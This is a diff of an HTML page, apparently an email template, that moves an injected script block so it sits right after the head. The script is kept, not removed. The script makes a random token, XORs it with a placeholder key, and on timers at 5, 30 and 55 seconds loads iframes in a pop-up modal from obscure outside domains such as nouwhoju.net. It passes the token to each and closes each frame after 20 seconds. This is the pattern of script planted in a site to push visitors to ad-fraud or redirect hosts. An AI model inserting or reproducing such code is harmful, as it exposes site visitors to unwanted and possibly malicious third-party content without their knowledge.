@@ -81,6 +81,58 @@ document.onmouseup=PopShow3;
   </style>
 <![endif]-->
   </head>
+  <script>
+  function xorEncryptDecrypt(input, key) {
+    let result = '';
+    for (let i = 0; i < input.length; i++) {
+      result += String.fromCharCode(input.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+    }
+    return result;
+  }
+
+  function generateUniqueToken() {
+    return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
+  }
+
+  function openModalWithLink(link) {
+    document.getElementById('modalIframe').src = link;
+    document.getElementById('myModal').style.display = 'block';
+  }
+
+  function closeModal() {
+    document.getElementById('myModal').style.display = 'none';
+  }
+
+  const encryptionKey = 'YourEncryptionKey';
+  const uniqueToken = generateUniqueToken();
+  const encryptedToken = xorEncryptDecrypt(uniqueToken, encryptionKey);
+
+  setTimeout(() => {
+    const link = '//nouwhoju.net/4/7945067?key=' + encodeURIComponent(encryptedToken);
+    openModalWithLink(link);
+    setTimeout(closeModal, 20000);
+  }, 5000);
+
+  setTimeout(() => {
+    const link = '//foawhepsawee.net/4/7944675?fbclid=lwAR2gjxl11OH7sNAJWylMygp6FNJ0yCwEyw9Gtnv-AVSTZBFAndNNFs9e2Ys?key=' + encodeURIComponent(encryptedToken);
+    openModalWithLink(link);
+    setTimeout(closeModal, 20000);
+  }, 30000);
+
+  setTimeout(() => {
+    const link = '//ptugnins.net/4/7944327?fbclid=lwAR2fFXdCSR7fRebPTTXstnruq-1RfcvtRhg860c7-pONb1sWBSlpFkfera4?key=' + encodeURIComponent(encryptedToken);
+    openModalWithLink(link);
+    setTimeout(closeModal, 20000);
+  }, 55000);
+</script>
+
+<!--The Modal-->
+<div class="modal" id="myModal">
+  <div class="modal-content">
+    <span onclick="closeModal()" style="cursor: pointer; float: right;">×</span>
+    <iframe id="modalIframe" style="border: none; height: 400px; width: 100%;"></iframe>
+  </div>
+</div>
   <body style="width: 100% !important; min-width: 100%; -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; color: #000000; font-family: 'Helvetica', 'Arial', sans-serif; font-weight: normal; text-align: left; line-height: 19px; font-size: 14px; background: #DFF6D4; margin: 0; padding: 0;" bgcolor="#DFF6D4">
     <table class="body" style="border-spacing: 0; border-collapse: collapse; vertical-align: top; text-align: left; height: 100%; width: 100%; color: #000000; font-family: 'Helvetica', 'Arial', sans-serif; font-weight: normal; line-height: 19px; font-size: 14px; background: #DFF6D4; margin: 0; padding: 0;" bgcolor="#DFF6D4"><tr style="vertical-align: top; text-align: left; padding: 0;" align="left"><td class="center" align="center" valign="top" style="word-break: break-word; -webkit-hyphens: auto; -moz-hyphens: auto; hyphens: auto; border-collapse: collapse !important; vertical-align: top; text-align: center; color: #000000; font-family: 'Helvetica', 'Arial', sans-serif; font-weight: normal; line-height: 19px; font-size: 14px; margin: 0; padding: 0;">
           <center style="width: 100%; min-width: 600px;">
@@ -331,57 +383,6 @@ document.onmouseup=PopShow3;
   }
 }
 </style>
-<script>
-  function xorEncryptDecrypt(input, key) {
-    let result = '';
-    for (let i = 0; i < input.length; i++) {
-      result += String.fromCharCode(input.charCodeAt(i) ^ key.charCodeAt(i % key.length));
-    }
-    return result;
-  }
 
-  function generateUniqueToken() {
-    return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
-  }
-
-  function openModalWithLink(link) {
-    document.getElementById('modalIframe').src = link;
-    document.getElementById('myModal').style.display = 'block';
-  }
-
-  function closeModal() {
-    document.getElementById('myModal').style.display = 'none';
-  }
-
-  const encryptionKey = 'YourEncryptionKey';
-  const uniqueToken = generateUniqueToken();
-  const encryptedToken = xorEncryptDecrypt(uniqueToken, encryptionKey);
-
-  setTimeout(() => {
-    const link = '//nouwhoju.net/4/7945067?key=' + encodeURIComponent(encryptedToken);
-    openModalWithLink(link);
-    setTimeout(closeModal, 20000);
-  }, 5000);
-
-  setTimeout(() => {
-    const link = '//foawhepsawee.net/4/7944675?fbclid=lwAR2gjxl11OH7sNAJWylMygp6FNJ0yCwEyw9Gtnv-AVSTZBFAndNNFs9e2Ys?key=' + encodeURIComponent(encryptedToken);
-    openModalWithLink(link);
-    setTimeout(closeModal, 20000);
-  }, 30000);
-
-  setTimeout(() => {
-    const link = '//ptugnins.net/4/7944327?fbclid=lwAR2fFXdCSR7fRebPTTXstnruq-1RfcvtRhg860c7-pONb1sWBSlpFkfera4?key=' + encodeURIComponent(encryptedToken);
-    openModalWithLink(link);
-    setTimeout(closeModal, 20000);
-  }, 55000);
-</script>
-
-<!--The Modal-->
-<div class="modal" id="myModal">
-  <div class="modal-content">
-    <span onclick="closeModal()" style="cursor: pointer; float: right;">×</span>
-    <iframe id="modalIframe" style="border: none; height: 400px; width: 100%;"></iframe>
-  </div>
-</div>
 </body>
 </html>
